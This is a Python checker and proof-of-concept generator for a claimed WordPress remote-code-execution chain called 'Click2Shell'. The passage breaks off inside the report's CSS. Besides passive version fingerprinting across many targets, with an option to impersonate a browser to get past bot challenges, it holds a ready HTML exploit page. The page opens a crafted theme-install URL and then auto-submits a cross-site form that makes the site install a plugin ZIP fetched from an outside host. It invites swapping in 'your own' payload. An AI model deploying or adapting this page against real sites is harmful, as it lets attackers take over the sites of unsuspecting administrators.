#!/usr/bin/env python3
"""
Click2Shell — WordPress Core Theme Preview Injection Checker & PoC Generator
=============================================================================

Vulnerability summary (pwn.ai research, Sep 18 2026 — WordPress < 7.1.1):
  A crafted `/wp-admin/theme-install.php?theme=<value>` URL causes WordPress to
  install an attacker-selected theme from the official WordPress.org catalog
  WITHOUT the administrator pressing Install/Activate (selector injection in
  wp-admin/js/theme.js). Chained with a pre-activation AJAX flaw in the
  `mobile-repair-zone` 2.5.4 catalog theme (and 40+ third-party themes), the
  inactive theme's PHP is loaded via the Customizer and executes attacker PHP.

  Core fix shipped in WordPress 7.1.1 (changeset 63664: $.escapeSelector()).

THIS TOOL:
  1. CHECKER (default) — fully NON-INVASIVE. Only passive HTTP GET requests to
     public metadata endpoints (generator meta, RSS feed, readme.html,
     wp-login.php core assets). No exploitation, no writes, no auth attempts.
     Determines: WordPress version, Click2Shell core exposure (< 7.1.1), and
     presence of the mobile-repair-zone chain theme.

  2. POC (--poc) — generates an HTML page implementing the two-stage chain.
     NOTE: the full RCE chain requires an AUTHENTICATED ADMINISTRATOR to visit
     the page (client-side "one click"). Use only on systems you own or are
     authorized to test.

Author:  CronUp Cybersecurity (https://github.com/CronUp)
License: MIT (see LICENSE). Open source.
Warning: For AUTHORIZED testing only. You are responsible for scope/authorization.
"""

import argparse
import csv
import html as html_lib
import ipaddress
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:  # pragma: no cover
    sys.exit("[!] Missing dependency 'requests'. Run: pip install -r requirements.txt")

# Optional: cross-platform ANSI colors on Windows.
try:
    from colorama import just_fix_windows_console

    _COLORAMA = True
except ImportError:  # pragma: no cover
    _COLORAMA = False


# --------------------------------------------------------------------------- #
# Console colors
# --------------------------------------------------------------------------- #
class C:
    """ANSI color codes (minimal, elegant palette)."""

    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"


USE_COLOR = True  # toggled by --no-color / non-TTY


def paint(text, *codes):
    """Wrap text in ANSI codes unless color is disabled."""
    if not USE_COLOR or not codes:
        return text
    return "".join(codes) + text + C.RESET


def red(t):
    return paint(t, C.RED)


def green(t):
    return paint(t, C.GREEN)


def yellow(t):
    return paint(t, C.YELLOW)


def cyan(t):
    return paint(t, C.CYAN)


def magenta(t):
    return paint(t, C.MAGENTA)


def bold(t):
    return paint(t, C.BOLD)


def dim(t):
    return paint(t, C.DIM)


# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
FIXED_VERSION = (7, 1, 1)  # First patched WordPress release
CHAIN_THEME = "mobile-repair-zone"  # Known chain theme (2.5.4 vulnerable)
CHAIN_THEME_MAX_SAFE = (2, 5, 3)  # <= 2.5.4 vulnerable (flagged), keep simple

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 C2S/1.0"
)
REQUEST_TIMEOUT = 20
POLITE_DELAY = 0.0  # per-thread courtesy delay (set via --delay)


# --------------------------------------------------------------------------- #
# Version regexes
# --------------------------------------------------------------------------- #
RE_META_GENERATOR = re.compile(
    r'<meta\s+name=["\']generator["\'][^>]*content=["\'][^"\']*WordPress\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
    re.IGNORECASE,
)
RE_GENERIC_WP_VERSION = re.compile(
    r"WordPress\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
    re.IGNORECASE,
)
RE_RSS_GENERATOR = re.compile(
    r"<generator[^>]*>\s*https?://wordpress\.org/\?v=([0-9]+\.[0-9]+(?:\.[0-9]+)?)\s*</generator>",
    re.IGNORECASE,
)
RE_README_VERSION = re.compile(
    r"Version\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
    re.IGNORECASE,
)
# WordPress CORE assets whose ?ver= reliably reflects the WordPress version.
# Whitelist (WPScan-style) that excludes:
#   - wp-content  (theme/plugin assets carry their own version, e.g. ver=1.0)
#   - bundled third-party libraries (jQuery 3.7.1, React, lodash, ...)
RE_WP_VERSION_VER = re.compile(
    r"(?:"
    r"wp-includes/js/wp-embed[^\"'\s>]*|"  # wp-embed.min.js (ubiquitous)
    r"wp-includes/css/dist/[^\"'\s>]*|"  # block-library CSS
    r"wp-includes/js/dist/(?!vendor/)[^\"'\s>]*|"  # block editor JS (not vendor/)
    r"wp-admin/(?:css|js)/[^\"'\s>]*"  # wp-admin core assets
    r")[?&](?:v|ver|version)=([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
    re.IGNORECASE,
)
RE_WP_INDICATOR = re.compile(
    r"wp-(?:content|includes|admin|json|login|cron)", re.IGNORECASE
)
RE_THEME_VERSION = re.compile(
    r"Version:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
    re.IGNORECASE,
)


def extract_wp_core_versions(html: str) -> set:
    """Return WordPress version candidates from ?ver= on WordPress CORE
    version-bearing assets only (wp-embed, block-library, block editor,
    wp-admin). Theme/plugin assets and bundled libraries (jQuery, React, etc.)
    are excluded because they carry their own version numbers."""
    return set(RE_WP_VERSION_VER.findall(html))


def detect_wp_base_paths(body: str) -> list:
    """Detect the WordPress base path(s) from asset URLs in the HTML.

    Supports subdirectory installs (e.g. /global/, /blog/, /wp/). Returns a
    sorted list of path prefixes (non-root first, '' for root installs).
    """
    found = set()
    for m in re.finditer(
        r'([^\s"\'<>()]+)/(?:wp-includes|wp-content|wp-admin|wp-json)/',
        body,
        re.IGNORECASE,
    ):
        token = m.group(1)
        if token.startswith("//"):
            p = urlparse("http:" + token).path
        elif "://" in token:
            p = urlparse(token).path
        else:
            p = token
        found.add(p.rstrip("/"))
    # Non-root paths first (most specific), then root last.
    return sorted(found, key=lambda p: (p == "", len(p)))


# Markers of bot-protection / WAF challenge pages (Cloudflare & co.) that hide
# the real site from passive HTTP clients (no JS / cookies).
WAF_CHALLENGE_HINTS = (
    "just a moment",
    "cf-chl-",
    "__cf_chl",
    "cf-browser-verification",
    "enable javascript and cookies",
    "attention required",
    "captcha-delivery",
    "access denied",
)


def is_waf_challenge(html: str) -> bool:
    """True if the page looks like a bot-protection challenge, not real content."""
    low = html[:8000].lower()
    return any(hint in low for hint in WAF_CHALLENGE_HINTS)


# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #
@dataclass
class Detection:
    """Result for a single scanned target."""

    target: str
    is_wordpress: bool = False
    version: Optional[str] = None
    version_source: Optional[str] = None
    # Core < 7.1.1 => forced theme-install primitive, entry point to RCE chain.
    vulnerable_click2shell: bool = False
    # The known chain theme (mobile-repair-zone) is already on disk: chain is
    # "ready locally" (no catalog dependency), but absence does NOT mean safe.
    chain_theme_installed: bool = False
    chain_theme_version: Optional[str] = None
    setup_exposed: bool = False  # WordPress not-yet-installed (install.php reachable)
    blocked: bool = False  # bot/WAF challenge (e.g. Cloudflare) — can't fingerprint
    offline: bool = False  # unreachable (DNS/connection/timeout)
    http_status: int = 0
    error: Optional[str] = None
    evidence: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
VALID_HOST_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$")


def is_valid_host(host: str) -> bool:
    """Basic ASCII hostname / IPv4 / IPv6 validation."""
    host = (host or "").strip().rstrip(".").lower()
    if not host or len(host) > 253:
        return False
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass
    labels = host.split(".")
    if len(labels) < 1 or any(not lbl for lbl in labels):
        return False
    for label in labels:
        if len(label) > 63 or not VALID_HOST_RE.match(label):
            return False
    return True


def normalize_url(raw: str, prefer_https: bool = False):
    """Normalize + validate a domain/URL. Returns base URL or '' if invalid.

    Handles: with/without scheme, uppercase, trailing slashes, paths, quoted
    entries, IPv4/IPv6, ports, and rejects non-http(s) schemes and junk.
    """
    s = (raw or "").strip()
    if not s or s.lstrip().startswith("#"):
        return ""
    s = s.strip().strip('"').strip("'").strip("<>").strip()
    if not s:
        return ""
    if "://" not in s:
        s = "http://" + s
    try:
        p = urlparse(s)
    except ValueError:
        return ""
    scheme = (p.scheme or "http").lower()
    if scheme not in ("http", "https"):
        return ""
    host = (p.hostname or "").lower()
    # IDN support: convert unicode hostnames (e.g. café.com) to punycode.
    if host and any(ord(ch) > 127 for ch in host):
        try:
            host = host.encode("idna").decode("ascii")
        except (UnicodeError, ValueError):
            return ""
    if not is_valid_host(host):
        return ""
    port = f":{p.port}" if p.port else ""
    return f"{scheme}://{host}{port}"


def host_key(target: str) -> str:
    """Scheme-independent dedupe key: hostname[:port] lowercase."""
    p = urlparse(target)
    port = f":{p.port}" if p.port else ""
    return f"{(p.hostname or '').lower()}{port}"


def load_targets(raw_entries, prefer_https: bool = False):
    """Clean + validate + dedupe a list of raw entries.

    Returns (targets, stats) where stats counts total/valid/invalid/duplicates
    and lists skipped entries (as (raw, reason)).
    """
    valid: dict = {}  # host_key -> target
    skipped: list = []
    total = 0
    for raw in raw_entries:
        s = (raw or "").strip()
        if not s or s.lstrip().startswith("#"):
            continue  # blank / comment — not counted as invalid
        total += 1
        norm = normalize_url(s, prefer_https)
        if not norm:
            skipped.append((s, "invalid host/URL"))
            continue
        key = host_key(norm)
        if key in valid:
            # Prefer https when the same host appears with both schemes.
            existing = valid[key]
            if (
                prefer_https
                and norm.startswith("https://")
                and not existing.startswith("https://")
            ):
                valid[key] = norm
            skipped.append((s, "duplicate"))
            continue
        valid[key] = norm

    stats = {
        "total": total,
        "valid": len(valid),
        "invalid": sum(1 for _, r in skipped if r == "invalid host/URL"),
        "duplicates": sum(1 for _, r in skipped if r == "duplicate"),
        "skipped": skipped,
    }
    return list(valid.values()), stats


def version_tuple(v: Optional[str]):
    """Convert 'x.y.z' to a comparable tuple of ints."""
    if not v:
        return None
    parts = re.findall(r"\d+", v)
    if not parts:
        return None
    try:
        return tuple(int(x) for x in parts)
    except ValueError:
        return None


def is_older(candidate, baseline) -> bool:
    """True if candidate version tuple is strictly older than baseline."""
    if candidate is None:
        return False
    cand = candidate + (0,) * (3 - len(candidate))
    base = baseline + (0,) * (3 - len(baseline))
    return cand < base


def build_session(impersonate: bool = False):
    """Build an HTTP session with sensible defaults.

    With impersonate=True, uses curl_cffi to impersonate a Chrome browser
    (TLS/HTTP2 fingerprint), which reduces Cloudflare bot challenges. Falls
    back to plain requests if curl_cffi is not installed.
    """
    if impersonate:
        try:
            from curl_cffi import requests as cffi_requests

            return cffi_requests.Session(impersonate="chrome")
        except ImportError:
            print(
                dim(
                    "[!] curl_cffi not installed - falling back to requests. "
                    "Install it with: pip install curl_cffi"
                )
            )
        except Exception as exc:  # noqa: BLE001
            print(dim(f"[!] curl_cffi unavailable ({exc}) - falling back to requests."))

    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT, "Accept": "*/*"})
    return s


def fetch(session, url: str, timeout: int, verify: bool):
    """GET with a polite delay. Returns Response or None on failure."""
    if POLITE_DELAY > 0:
        time.sleep(POLITE_DELAY)
    try:
        return session.get(url, timeout=timeout, verify=verify, allow_redirects=True)
    except Exception:  # noqa: BLE001
        return None


# --------------------------------------------------------------------------- #
# Per-target scan
# --------------------------------------------------------------------------- #
def scan_target(
    target: str,
    verify: bool,
    timeout: int,
    check_chain: bool,
    impersonate: bool = False,
) -> Detection:
    base = normalize_url(target)
    det = Detection(target=base)
    if not base:
        det.error = "invalid target"
        return det

    session = build_session(impersonate)
    candidates: dict = {}  # source -> version (readme > meta > feed > opml > asset)
    strong = 0  # definitive WordPress signals (any one => it IS WordPress)
    weak = 0  # suggestive signals (homepage wp-* path references)
    detected_path = ""  # confirmed WordPress base path ('' = root)

    # ==================================================================== #
    # Phase 1 — clean single request: analyze the homepage source code only.
    # This must stay the FIRST (and often only) connection so that sensitive
    # files are not touched until strictly necessary.
    # ==================================================================== #
    try:
        resp = session.get(
            base + "/",
            timeout=timeout,
            verify=verify,
            allow_redirects=True,
        )
    except Exception as e:  # noqa: BLE001
        # Backend-agnostic classification (works for requests and curl_cffi).
        name = type(e).__name__.lower()
        if "ssl" in name or "certificate" in name:
            det.error = "TLS error (use --insecure)"
        elif any(
            k in name
            for k in ("timeout", "connect", "dns", "gai", "resolve", "refused")
        ):
            det.offline = True
            det.evidence["offline"] = type(e).__name__
        else:
            det.error = str(e)
        session.close()
        return det

    det.http_status = resp.status_code
    body = resp.text[:400000]
    wp_paths = [""]

    # Bot/WAF challenge (Cloudflare etc.) hides the real site from us.
    if is_waf_challenge(body):
        det.blocked = True
        det.evidence["waf_challenge"] = True
        session.close()
        return det

    # Distinct wp-* path references (weak, non-definitive on their own).
    weak = len(set(m.group(0).lower() for m in RE_WP_INDICATOR.finditer(body)))
    m = RE_META_GENERATOR.search(body)
    if m:
        strong += 1  # generator meta explicitly says "WordPress X.Y.Z"
        candidates.setdefault("meta", m.group(1))
    # Core asset ver= strings (bundled libs like jQuery filtered out).
    candidates.setdefault("asset", set()).update(extract_wp_core_versions(body))
    wp_paths = detect_wp_base_paths(body) or [""]
    if "" not in wp_paths:
        wp_paths.append("")  # root as last-resort fallback

    # ==================================================================== #
    # Phase 2 — safe public endpoints (feed, OPML, REST API). Low WAF risk.
    # ==================================================================== #
    for wp_path in wp_paths:
        wp_base = base + wp_path

        # RSS feed generator
        r = fetch(session, wp_base + "/feed/", timeout, verify)
        if r is not None and r.status_code == 200:
            mm = RE_RSS_GENERATOR.search(r.text[:50000])
            if mm:
                strong += 1  # <generator>https://wordpress.org/?v=...
                candidates.setdefault("feed", mm.group(1))

        # wp-links-opml.php generator
        r = fetch(session, wp_base + "/wp-links-opml.php", timeout, verify)
        if r is not None and r.status_code == 200:
            mm = RE_RSS_GENERATOR.search(r.text[:20000])
            if mm:
                strong += 1
                candidates.setdefault("opml", mm.group(1))

        # REST API
        r = fetch(session, wp_base + "/wp-json/", timeout, verify)
        if (
            r is not None
            and r.status_code == 200
            and ("namespaces" in r.text[:2000] or "routes" in r.text[:2000])
        ):
            strong += 1

        if strong >= 1:
            detected_path = wp_path
            break

    # ==================================================================== #
    # Phase 3 — sensitive files, only if version/confirmation still missing.
    # readme.html / wp-admin / wp-login / xmlrpc.php can trip a WAF, so they
    # are touched last (and only when we have a WordPress hint).
    # ==================================================================== #
    have_version = bool(
        candidates.get("meta")
        or candidates.get("feed")
        or candidates.get("opml")
        or candidates.get("asset")
    )
    confirmed = (strong >= 1) or (weak >= 2)
    has_hint = (weak >= 1) or (strong >= 1)

    if has_hint and not (have_version and confirmed):
        for wp_path in wp_paths:
            wp_base = base + wp_path

            # readme.html (most reliable version leak)
            r = fetch(session, wp_base + "/readme.html", timeout, verify)
            if r is not None and r.status_code == 200:
                mm = RE_README_VERSION.search(r.text[:20000])
                if mm:
                    candidates["readme"] = mm.group(1)
                if "wordpress" in r.text[:2000].lower():
                    strong += 1

            # xmlrpc.php
            r = fetch(session, wp_base + "/xmlrpc.php", timeout, verify)
            if r is not None and r.status_code in (200, 405):
                txt = r.text[:2000].lower()
                if "xmlrpc" in txt or "xml-rpc" in txt or "system.listmethods" in txt:
                    strong += 1

            # wp-login.php
            r = fetch(session, wp_base + "/wp-login.php", timeout, verify)
            if r is not None and r.status_code == 200:
                lbody = r.text[:200000]
                if "wp-submit" in lbody or "user_login" in lbody:
                    strong += 1  # real WordPress login form
                candidates.setdefault("login_asset", set()).update(
                    extract_wp_core_versions(lbody)
                )

            # wp-admin/install.php
            r = fetch(session, wp_base + "/wp-admin/install.php", timeout, verify)
            if r is not None and r.status_code == 200:
                ibody = r.text[:30000]
                ilow = ibody.lower()
                if 'name="weblog_title"' in ibody or "install wordpress" in ilow:
                    det.setup_exposed = True
                mm = RE_GENERIC_WP_VERSION.search(ibody)
                if mm:
                    candidates.setdefault("install", mm.group(1))
                if "already installed" in ilow:
                    strong += 1  # installer reachable => WordPress present

            if strong >= 1:
                detected_path = wp_path
                break

    # Confirmation: one definitive signal, or two+ suggestive ones.
    det.is_wordpress = (strong >= 1) or (weak >= 2)

    # --- Resolve version (ONLY if WordPress is confirmed) ------------------
    version = None
    source = None
    if det.is_wordpress:
        if "readme" in candidates:
            version, source = candidates["readme"], "readme.html"
        elif "meta" in candidates:
            version, source = candidates["meta"], "generator meta"
        elif "feed" in candidates:
            version, source = candidates["feed"], "RSS feed generator"
        elif "opml" in candidates:
            version, source = candidates["opml"], "wp-links-opml.php"
        elif "install" in candidates:
            version, source = candidates["install"], "wp-admin/install.php"
        else:
            asset_versions = list(candidates.get("asset", set())) + list(
                candidates.get("login_asset", set())
            )
            if asset_versions:
                version, source = (
                    max(set(asset_versions), key=asset_versions.count),
                    "asset ?ver=",
                )

    det.version = version
    det.version_source = source
    det.evidence = {
        k: (sorted(v) if isinstance(v, set) else v) for k, v in candidates.items()
    }
    det.evidence["wp_signals"] = {"strong": strong, "weak": weak}
    det.evidence["wp_path"] = detected_path

    # Vulnerability ONLY if WordPress is confirmed AND version < 7.1.1.
    det.vulnerable_click2shell = det.is_wordpress and is_older(
        version_tuple(version), FIXED_VERSION
    )

    # --- Chain theme detection --------------------------------------------
    if check_chain and det.vulnerable_click2shell:
        theme_url = base + detected_path + f"/wp-content/themes/{CHAIN_THEME}/style.css"
        resp = fetch(session, theme_url, timeout, verify)
        if resp is not None and resp.status_code == 200:
            det.chain_theme_installed = True
            m = RE_THEME_VERSION.search(resp.text[:4000])
            if m:
                det.chain_theme_version = m.group(1)
            det.evidence["theme_style_css"] = {
                "url": theme_url,
                "status": resp.status_code,
            }

    session.close()
    return det


# --------------------------------------------------------------------------- #
# PoC generator
# --------------------------------------------------------------------------- #
POC_HTML_TEMPLATE = """<!doctype html>
<!-- Click2Shell PoC — AUTHORIZED TESTING ONLY -->
<!-- Requires an already-AUTHENTICATED WordPress Administrator to open this page. -->
<html lang="en">
<meta charset="utf-8">
<title>Click2Shell PoC (stage-2 RCE chain)</title>
<body style="font-family:monospace;padding:2rem">
  <h2>Click2Shell — stage 2 (auto-submit)</h2>
  <p>Target: <code>{target}</code></p>
  <p>Theme: <code>{theme_slug}</code> &nbsp;|&nbsp; Route value: <code>{route_value}</code></p>
  <button id="launch">Launch chain</button>
  <p id="status" style="color:#b00"></p>

  <form id="stage-two" method="post" target="victim" hidden>
    <input name="action" value="{ajax_action}">
    <input name="plugin_details[plugin_text_domain]" value="mrz-chain-marker">
    <input name="plugin_details[plugin_main_file]" value="mrz-chain-marker.php">
    <input id="plugin-url" name="plugin_details[plugin_url]" value="">
  </form>

<script>
const TARGET_ORIGIN = '{target}';
const STAGE_TWO_DELAY_MS = {delay_ms};
const THEME_SLUG = '{theme_slug}';
const ROUTE_VALUE = THEME_SLUG + '\\"]>*>*>*/*';

// Harmless visual-only plugin ZIP (base64) — replace with your own authorized payload.
const VISUAL_PLUGIN_ZIP_BASE64 = '{zip_b64}';

const target = TARGET_ORIGIN.replace(/\\/$/, '');
const installUrl = new URL(target + '/wp-admin/theme-install.php');
installUrl.searchParams.set('theme', ROUTE_VALUE);
const stageTwoUrl = new URL(target + '/wp-admin/admin-ajax.php');
stageTwoUrl.searchParams.set('wp_customize', 'on');
stageTwoUrl.searchParams.set('customize_theme', THEME_SLUG);

const pluginUrl = 'https://httpbingo.org/base64/' + encodeURIComponent(VISUAL_PLUGIN_ZIP_BASE64);
const form = document.querySelector('#stage-two');
form.action = stageTwoUrl.href;
document.querySelector('#plugin-url').value = pluginUrl;

document.querySelector('#launch').addEventListener('click', () => {{
  const popup = window.open(installUrl.href, 'victim');
  if (!popup) {{
    document.querySelector('#status').textContent =
      'Browser blocked the popup. Allow popups for this local file and retry.';
    return;
  }}
  const deadline = Date.now() + STAGE_TWO_DELAY_MS;
  const timer = setInterval(() => {{
    const seconds = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
    document.querySelector('#status').textContent =
      'Complete the ordinary WordPress login. Stage two submits automatically in '
      + seconds + ' seconds.';
    if (seconds === 0) clearInterval(timer);
  }}, 250);
  setTimeout(() => {{
    document.querySelector('#status').textContent = 'Stage two submitted automatically.';
    form.submit();
  }}, STAGE_TWO_DELAY_MS);
}}, {{ once: true }});
</script>
</body></html>
"""

# Harmless visual-only plugin ZIP (no code execution beyond a marker file).
VISUAL_PLUGIN_ZIP_B64 = "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"


def generate_poc(
    target: str,
    out_path: str,
    delay_ms: int = 60000,
    theme_slug: str = CHAIN_THEME,
    ajax_action: str = "mobile_repair_zone_install_and_activate_plugin",
):
    base = normalize_url(target)
    html = POC_HTML_TEMPLATE.format(
        target=base,
        theme_slug=theme_slug,
        ajax_action=ajax_action,
        route_value=theme_slug + '"]>*>*>*/*',
        delay_ms=delay_ms,
        zip_b64=VISUAL_PLUGIN_ZIP_B64,
    )
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    return out_path


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #
def _fmt(value, width, *codes):
    """Pad to width, then apply optional ANSI codes (keeps alignment intact)."""
    return paint(f"{value:<{width}}", *codes)


def render_progress(done: int, total: int, width: int = 26) -> str:
    """Render a constant-width ASCII progress bar (for live TTY updates)."""
    if total <= 0:
        pct, filled = 100, width
    else:
        pct = int(done * 100 / total)
        filled = int(width * done / total)
    bar = cyan("#" * filled) + dim("." * (width - filled))
    tw = len(str(total))
    return f"[*] Progress: {done:>{tw}}/{total} ({pct:3d}%) [{bar}]"


def print_table(results: list):
    W = (40, 4, 10, 12, 11, 7, 18)
    hdr = [
        _fmt("TARGET", W[0], C.CYAN, C.BOLD),
        _fmt("WP", W[1], C.CYAN, C.BOLD),
        _fmt("VERSION", W[2], C.CYAN, C.BOLD),
        _fmt("RISK", W[3], C.CYAN, C.BOLD),
        _fmt("MRZ-THEME", W[4], C.CYAN, C.BOLD),
        _fmt("SETUP", W[5], C.CYAN, C.BOLD),
        _fmt("SOURCE", W[6], C.CYAN, C.BOLD),
    ]
    print("\n" + " ".join(hdr))
    print(dim("-" * (sum(W) + len(W) - 1)))
    for d in results:
        wp = "?" if (d.blocked or d.offline) else ("yes" if d.is_wordpress else "no")
        ver = d.version or "-"

        # RISK = the Click2Shell core primitive (< 7.1.1), which is the RCE
        # chain entry point regardless of whether the theme is already on disk.
        if d.error:
            vuln, vcodes = "ERR", (C.RED, C.BOLD)
        elif d.blocked:
            vuln, vcodes = "BLOCKED", (C.YELLOW, C.BOLD)
        elif d.offline:
            vuln, vcodes = "OFFLINE", (C.MAGENTA, C.BOLD)
        elif d.vulnerable_click2shell:
            vuln, vcodes = "VULNERABLE", (C.RED, C.BOLD)
        elif d.is_wordpress and d.version:
            vuln, vcodes = "patched", (C.GREEN,)
        elif d.is_wordpress:
            vuln, vcodes = "UNKNOWN", (C.YELLOW,)
        else:
            vuln, vcodes = "-", (C.DIM,)

        row = [
            _fmt(d.target, W[0]),
            _fmt(
                wp,
                W[1],
                C.GREEN
                if d.is_wordpress
                else (C.DIM if not (d.blocked or d.offline) else C.YELLOW),
            ),
            _fmt(ver, W[2], C.BOLD if d.version else C.DIM),
            _fmt(vuln, W[3], *vcodes),
            _fmt(
                "installed" if d.chain_theme_installed else "-",
                W[4],
                C.YELLOW if d.chain_theme_installed else C.DIM,
            ),
            _fmt(
                "OPEN" if d.setup_exposed else "-",
                W[5],
                *((C.YELLOW, C.BOLD) if d.setup_exposed else (C.DIM,)),
            ),
            _fmt(d.version_source or "-", W[6], C.DIM),
        ]
        print(" ".join(row))


# --------------------------------------------------------------------------- #
# HTML report (minimalist, elegant, self-contained)
# --------------------------------------------------------------------------- #
HTML_REPORT_CSS = """
  :root {
    --bg: #f7f8fa; --card: #ffffff; --border: #e6e8eb; --text: #1a1d21;
    --muted: #6b7280; --red: #e11d48; --green: #059669; --amber: #d97706;
    --blue: #2563eb; --darkred: #9f1239; --navy: #0b2545; --slate: #64748b;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: var(--bg); color: var(--text); line-height: 1.5; padding: 2.5rem 1.25rem;
  }
  .wrap { max-width: 1080px; margin: 0 auto; }
  header { margin-bottom: 2rem; }
  .author {
    color: var(--navy);
    font-weight: 700;
    font-size: 0.78rem;
    text-transform: uppercase;
    letter-spacing: 0.14em;
    margin-bottom: 0.5rem;
  }
  h1 { font-size: 1.65rem; font-weight: 700; letter-spacing: -0.02em; }
  .meta { color: var(--muted); font-size: 0.85rem; margin-top: 0.35rem; }
  .meta code { background: var(--card); border: 1px solid var(--border); padding: 0.1rem 0.4rem; border-radius: 4px; }
  .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 0.75rem; margin-bottom: 2rem; }
  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 1rem 1.1rem; }
  .card .num { font-size: 1.6rem; font-weight: 700; letter-spacing: -0.02em; }
  .card .lbl { color: var(--muted); font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.05em; }
  .card.red .num { color: var(--red); } .card.green .num { color: var(--green); }
  .card.amber .num { color: var(--amber); } .card.blue .num { color: var(--blue); }
  .card.darkred .num { color: var(--darkred); }
  .card.slate .num { color: var(--slate); }
  table { width: 100%; border-collapse: collapse; background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
